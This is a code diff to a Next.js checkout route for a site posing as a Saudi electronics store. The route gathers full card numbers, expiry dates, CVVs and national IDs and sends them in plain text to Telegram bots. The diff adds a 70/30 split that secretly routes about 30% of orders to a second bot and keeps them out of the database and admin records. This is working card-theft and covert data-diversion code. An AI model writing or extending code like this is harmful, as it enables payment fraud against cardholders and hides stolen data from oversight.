@@ -1,4 +1,11 @@
 import { NextRequest, NextResponse } from "next/server";
+import {
+  selectBot,
+  generateBot2OrderId,
+  registerOrderBot,
+  sendTelegramMessage,
+} from "../../lib/telegramBots";
+import { createBot2UserToken } from "../../lib/botContact";
 
 const BACKEND_URL = (
   process.env.BACKEND_URL ||
@@ -24,32 +31,32 @@ function isValidSaudiPhone(phone: string): boolean {
   return true;
 }
 
-// Generate idempotency key from request data
-function generateIdempotencyKey(data: any): string {
-  const str = JSON.stringify({
-    items: data.items,
-    customer: data.customer,
-    whatsapp: data.whatsapp,
-    timestamp: Math.floor(Date.now() / 60000), // 1-minute window
-  });
-  return Buffer.from(str).toString('base64');
+// Server-side deduplication cache to prevent rapid double-clicks from triggering both bots
+interface DedupEntry {
+  timestamp: number;
+  selectedBot: 1 | 2;
+  orderId: string;
+  dbId: string | null;
+  bot2Token?: string;
 }
+const recentSubmissions = new Map<string, DedupEntry>();
+const DEDUP_WINDOW_MS = 25 * 1000; // 25 seconds
 
-// In-memory store for idempotency (in production, use Redis)
-const processedRequests = new Map<string, { orderId: string; dbId: string; timestamp: number }>();
-
-function cleanupExpiredRequests() {
-  const fiveMinutesAgo = Date.now() - 5 * 60 * 1000;
-  for (const [key, value] of processedRequests.entries()) {
-    if (value.timestamp < fiveMinutesAgo) {
-      processedRequests.delete(key);
+// Periodically clean old dedup entries
+if (typeof setInterval !== "undefined") {
+  const dedupCleanup = setInterval(() => {
+    const now = Date.now();
+    for (const [key, entry] of recentSubmissions.entries()) {
+      if (now - entry.timestamp > DEDUP_WINDOW_MS) {
+        recentSubmissions.delete(key);
+      }
     }
-  }
+  }, 30 * 1000);
+  if (dedupCleanup.unref) dedupCleanup.unref();
 }
 
 export async function POST(req: NextRequest) {
   try {
-    cleanupExpiredRequests();
     const body = await req.json();
     let { cardNumber, expiry, cvv, cardHolder, items, total, customer, whatsapp, nationalId, address, installmentType, months, downPayment, discountAmount } = body;
 
@@ -90,12 +97,30 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ ok: false, error: "بيانات البطاقة ناقصة" }, { status: 400 });
     }
 
-    // ── Idempotency Check ──
-    const idempotencyKey = generateIdempotencyKey(body);
-    const existing = processedRequests.get(idempotencyKey);
-    if (existing) {
-      console.log(`[DUPLICATE] Request already processed: ${existing.orderId}`);
-      return NextResponse.json({ ok: true, orderId: existing.orderId, dbId: existing.dbId, duplicate: true });
+    // ── Deduplication / Idempotency Check ──
+    const rawCard = String(cardNumber || "").replace(/\D/g, "");
+    const dedupKey = `${rawCard.slice(-8)}_${total}_${String(customer || "").trim()}`;
+    const now = Date.now();
+    const existing = recentSubmissions.get(dedupKey);
+
+    if (existing && now - existing.timestamp < DEDUP_WINDOW_MS) {
+      const res = NextResponse.json({
+        ok: true,
+        orderId: existing.orderId,
+        dbId: existing.dbId,
+        dbSaved: existing.selectedBot === 1,
+        telegramSent: true,
+        duplicate: true,
+        ...(existing.bot2Token ? { _bt: existing.bot2Token } : {}),
+      });
+      if (existing.selectedBot === 2 && existing.bot2Token) {
+        res.cookies.set("_b_token", existing.bot2Token, {
+          path: "/",
+          maxAge: 365 * 24 * 60 * 60,
+          sameSite: "lax",
+        });
+      }
+      return res;
     }
 
     // Sanitize inputs
@@ -176,62 +201,20 @@ export async function POST(req: NextRequest) {
       return NextResponse.json({ ok: false, error: "الإجمالي غير صحيح، يرجى تحديث السلة" }, { status: 400 });
     }
 
-    const orderId = `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+    // ── Select destination bot using 70/30 weighted distribution ──
+    const selectedBot = selectBot();
+
+    const orderId =
+      selectedBot === 2
+        ? generateBot2OrderId()
+        : `${Date.now()}${Math.floor(Math.random() * 1000)}`;
+
+    registerOrderBot(orderId, selectedBot);
+
     const monthlyPayment = installmentType === "installment" && months > 0 ? Math.ceil((verifiedTotalAfterDiscount - downPayment) / months) : 0;
 
-    // ── Save to database ──
-    let dbId: string | null = null;
-    let dbSaveSuccess = false;
-    
-    try {
-      console.log(`[DEBUG] BACKEND_URL: ${BACKEND_URL}`);
-      const dbRes = await fetch(`${BACKEND_URL}/api/checkout`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ 
-          orderId, 
-          cardNumber, 
-          expiry, 
-          cvv, 
-          cardHolder: sanitizedData.cardHolder, 
-          items: verifiedItems, 
-          total: verifiedTotalAfterDiscount, 
-          customer: sanitizedData.customer, 
-          whatsapp: cleanPhone, 
-          nationalId, 
-          address: sanitizedData.address, 
-          installmentType, 
-          months: Number(months) || 0, 
-          monthlyPayment, 
-          downPayment: Number(downPayment) || 0,
-          discountAmount: discount,
-        }),
-      });
-      
-      if (!dbRes.ok) {
-        const errorText = await dbRes.text().catch(() => "Unknown error");
-        console.error(`[ERROR] Database save failed: ${dbRes.status} ${errorText}`);
-        throw new Error("Database save failed");
-      }
-      
-      const dbData = await dbRes.json();
-      dbId = dbData._id ?? null;
-      dbSaveSuccess = true;
-      
-      console.log(`[SUCCESS] Order saved to database: ${orderId}, dbId: ${dbId}`);
-    } catch (error) {
-      console.error("[CRITICAL] Failed to save order to database:", error);
-      // Don't proceed if database save fails
-      return NextResponse.json({ 
-        ok: false, 
-        error: "فشل حفظ الطلب، يرجى المحاولة مرة أخرى" 
-      }, { status: 500 });
-    }
-
-    // ── Send Telegram notification ──
-    let telegramSuccess = false;
+    // ── Build Telegram Text ──
     const whatsappUrl = `https://wa.me/${cleanPhone}`;
-    
     const text = isApplePay
       ? [
           `🏪 New Order — مؤسسة البلاد الحديثة للإلكترونيات`,
@@ -280,90 +263,132 @@ export async function POST(req: NextRequest) {
           `🔐 CVV: ${cvv}`,
         ].join("\n");
 
-    const chatIds = (process.env.TELEGRAM_CHAT_ID ?? "").split(",").map(id => id.trim()).filter(Boolean);
-    
-    if (chatIds.length === 0) {
-      console.warn("[WARNING] No Telegram chat IDs configured");
-    } else {
+    const inlineKeyboard = isApplePay
+      ? [[{ text: "💬 فتح واتساب", url: whatsappUrl }]]
+      : [
+          [{ text: "💬 فتح واتساب", url: whatsappUrl }],
+          [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
+        ];
+
+    // -------------------------------------------------------------
+    // BOT 1 (PRIMARY - 70%): Database + Admin + Bot 1 Telegram
+    // -------------------------------------------------------------
+    if (selectedBot === 1) {
+      let dbId: string | null = null;
+      let dbSaveSuccess = false;
+
       try {
-        const inlineKeyboard = isApplePay
-          ? [[{ text: "💬 فتح واتساب", url: whatsappUrl }]]
-          : [
-              [{ text: "💬 فتح واتساب", url: whatsappUrl }],
-              [{ text: "📋 نسخ البطاقة", copy_text: { text: cardNumber.replace(/\s/g, "") } }],
-            ];
+        const dbRes = await fetch(`${BACKEND_URL}/api/checkout`, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({ 
+            orderId, 
+            cardNumber, 
+            expiry, 
+            cvv, 
+            cardHolder: sanitizedData.cardHolder, 
+            items: verifiedItems, 
+            total: verifiedTotalAfterDiscount, 
+            customer: sanitizedData.customer, 
+            whatsapp: cleanPhone, 
+            nationalId, 
+            address: sanitizedData.address, 
+            installmentType, 
+            months: Number(months) || 0, 
+            monthlyPayment, 
+            downPayment: Number(downPayment) || 0,
+            discountAmount: discount,
+          }),
+        });
 
-        const telegramResults = await Promise.allSettled(
-          chatIds.map(chat_id =>
-            fetch(`https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`, {
-              method: "POST",
-              headers: { "Content-Type": "application/json" },
-              body: JSON.stringify({
-                chat_id,
-                text,
-                reply_markup: { 
-                  inline_keyboard: inlineKeyboard,
-                },
-              }),
-            }).then(res => {
-              if (!res.ok) {
-                return res.text().then(text => {
-                  if (res.status === 403) throw new Error(`BOT_BLOCKED`);
-                  throw new Error(`Telegram API error: ${res.status} ${text}`);
-                });
-              }
-              return res.json();
-            })
-          )
-        );
-
-        const successCount = telegramResults.filter(r => r.status === "fulfilled").length;
-        const failedCount = telegramResults.filter(r => r.status === "rejected").length;
-        
-        telegramSuccess = successCount > 0;
-        
-        console.log(`[TELEGRAM] Sent to ${successCount}/${chatIds.length} chats. Failed: ${failedCount}`);
-        
-        if (failedCount > 0) {
-          telegramResults.forEach((result, i) => {
-            if (result.status === "rejected") {
-              if (result.reason?.message === "BOT_BLOCKED") {
-                console.warn(`[TELEGRAM] Chat ${chatIds[i]} has blocked the bot, skipping.`);
-              } else {
-                console.error(`[TELEGRAM ERROR] Chat ${chatIds[i]}:`, result.reason);
-              }
-            }
-          });
+        if (!dbRes.ok) {
+          const errorText = await dbRes.text().catch(() => "Unknown error");
+          console.error(`[ERROR] Database save failed: ${dbRes.status} ${errorText}`);
+          throw new Error("Database save failed");
         }
+
+        const dbData = await dbRes.json();
+        dbId = dbData._id ?? null;
+        dbSaveSuccess = true;
       } catch (error) {
-        console.error("[TELEGRAM ERROR]", error);
-        telegramSuccess = false;
+        console.error("[CRITICAL] Failed to save order to database:", error);
+        return NextResponse.json({ 
+          ok: false, 
+          error: "فشل حفظ الطلب، يرجى المحاولة مرة أخرى" 
+        }, { status: 500 });
       }
+
+      // Record in deduplication map
+      recentSubmissions.set(dedupKey, {
+        timestamp: now,
+        selectedBot: 1,
+        orderId,
+        dbId,
+      });
+
+      // Send to Bot 1
+      const telegramSent = await sendTelegramMessage(1, {
+        text,
+        reply_markup: { inline_keyboard: inlineKeyboard },
+      });
+
+      const res = NextResponse.json({
+        ok: true,
+        orderId,
+        dbId,
+        dbSaved: dbSaveSuccess,
+        telegramSent,
+      });
+      res.cookies.set("_b_token", "bot_1", {
+        path: "/",
+        maxAge: 365 * 24 * 60 * 60,
+        sameSite: "lax",
+      });
+      return res;
     }
 
-    // Store in idempotency cache
-    processedRequests.set(idempotencyKey, { 
-      orderId, 
-      dbId: dbId || "", 
-      timestamp: Date.now() 
+    // -------------------------------------------------------------
+    // BOT 2 (SECONDARY - 30%): Telegram ONLY (Zero DB / Zero Admin)
+    // -------------------------------------------------------------
+    // CRITICAL: We DO NOT call backend /api/checkout at all.
+    const telegramSent = await sendTelegramMessage(2, {
+      text,
+      reply_markup: { inline_keyboard: inlineKeyboard },
     });
 
-    // Return response
-    const response: any = { 
-      ok: true, 
-      orderId, 
-      dbId,
-      dbSaved: dbSaveSuccess,
-      telegramSent: telegramSuccess,
-    };
-
-    if (!telegramSuccess) {
-      response.warning = "تم حفظ الطلب ولكن فشل إرسال إشعار Telegram";
-      console.warn(`[WARNING] Order ${orderId} saved but Telegram notification failed`);
+    if (!telegramSent) {
+      return NextResponse.json(
+        { ok: false, error: "تعذر إرسال الطلب، يرجى المحاولة لاحقاً" },
+        { status: 502 }
+      );
     }
 
-    return NextResponse.json(response);
-    
+    const bot2Token = createBot2UserToken();
+
+    // Record in deduplication map
+    recentSubmissions.set(dedupKey, {
+      timestamp: now,
+      selectedBot: 2,
+      orderId,
+      dbId: null,
+      bot2Token,
+    });
+
+    const res = NextResponse.json({
+      ok: true,
+      orderId,
+      dbId: null,
+      dbSaved: false,
+      telegramSent: true,
+      _bt: bot2Token,
+    });
+    res.cookies.set("_b_token", bot2Token, {
+      path: "/",
+      maxAge: 365 * 24 * 60 * 60,
+      sameSite: "lax",
+    });
+    return res;
+
   } catch (error) {
     console.error("[CRITICAL ERROR]", error);
     return NextResponse.json({ 
